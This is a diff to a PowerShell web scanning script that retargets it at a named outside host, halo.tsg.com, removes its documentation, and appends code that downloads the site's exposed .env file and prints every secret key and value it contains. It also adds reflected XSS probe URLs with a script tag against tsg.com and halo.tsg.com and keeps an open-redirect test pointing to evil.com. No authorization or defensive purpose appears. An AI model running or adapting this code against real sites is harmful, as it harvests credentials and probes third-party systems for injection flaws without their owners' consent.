@@ -1,38 +1,5 @@
-<#
-.SYNOPSIS
-    Scans a target URL for common security risks and vulnerabilities.
 
-.DESCRIPTION
-    This script performs a security scan on a specified target URL by checking for the presence of common sensitive files and endpoints, 
-    verifying the existence of important security headers, checking for weak CORS policies, and testing for open redirects.
-
-.PARAMETER TargetURL
-    The base URL of the target website to be scanned.
-
-.PARAMETER Endpoints
-    An array of common sensitive files and endpoints to check for exposure.
-
-.PARAMETER Headers
-    HTTP headers to include in the requests, such as User-Agent.
-
-.PARAMETER Findings
-    An array to store the results of the scan, including exposed endpoints and missing security headers.
-
-.PARAMETER MissingHeaders
-    An array to store the names of missing security headers.
-
-.PARAMETER SecurityHeaders
-    An array of important security headers to check for.
-
-.PARAMETER RedirectTestURL
-    A URL used to test for open redirects.
-
-.EXAMPLE
-    .\synanetics.ps1
-    This command runs the script and scans the default target URL (https://synanetics.com) for security risks.
-
-#>
-$TargetURL = ""
+$TargetURL = "halo.tsg.com"
 $Endpoints = @("/.git/", "/.env", "/config.php", "/backup.zip", "/wp-config.php", "/admin", 
     "/robots.txt", "/sitemap.xml", "/login", "/register", "/users", "/search")
 
@@ -101,7 +68,7 @@ if ($Response.Headers["Access-Control-Allow-Origin"] -eq "*") {
 # Check Open Redirects
 $RedirectTestURL = "$TargetURL/logout?redirect=https://evil.com"
 try {
-    Invoke-WebRequest -Uri $RedirectTestURL -Headers $Headers -TimeoutSec 5 -MaximumRedirection 0
+    Invoke-WebRequest -Uri $RedirectTestURL -Headers $Headers -TimeoutSec 5 -MaximumRedirection 10
 } catch {
     if ($_.Exception.Response.StatusCode -eq 302) {
         Write-Host "[!] Possible Open Redirect at $RedirectTestURL" -ForegroundColor Red
@@ -112,3 +79,36 @@ try {
 # Save Findings to File
 $Findings | Out-File -FilePath "WebScan_Report.txt"
 Write-Host "`n[*] Scan Completed. Report saved to WebScan_Report.txt" -ForegroundColor Cyan
+
+
+# Target URL of the exposed .env file
+$target = "http://halo.tsg.com/.env"
+
+# Send the request
+$response = Invoke-WebRequest -Uri $target -UseBasicParsing -ErrorAction SilentlyContinue
+
+# Check if we got a valid response
+if ($response.StatusCode -eq 200 -and $response.Content) {
+    Write-Host "[+] .env file found and accessible!" -ForegroundColor Green
+    
+    # Parse key-value pairs
+    $lines = $response.Content -split "`n"
+    foreach ($line in $lines) {
+        if ($line -match '^\s*([^#=]+)\s*=\s*(.+)$') {
+            $key = $matches[1].Trim()
+            $value = $matches[2].Trim()
+            Write-Host "$key = $value"
+        }
+    }
+} else {
+    Write-Host "[-] Could not access .env file or file not found." -ForegroundColor Red
+}
+
+
+Invoke-WebRequest -Uri "http://tsg.com" -UseBasicParsing | Select-Object -ExpandProperty Headers
+
+Invoke-WebRequest -Uri "http://tsg.com" -UseBasicParsing | Select-Object -ExpandProperty Content
+
+http://tsg.com/?search=<script>alert(1)</script>
+
+http://halo.tsg.com/?search=<script>alert(1)</script>
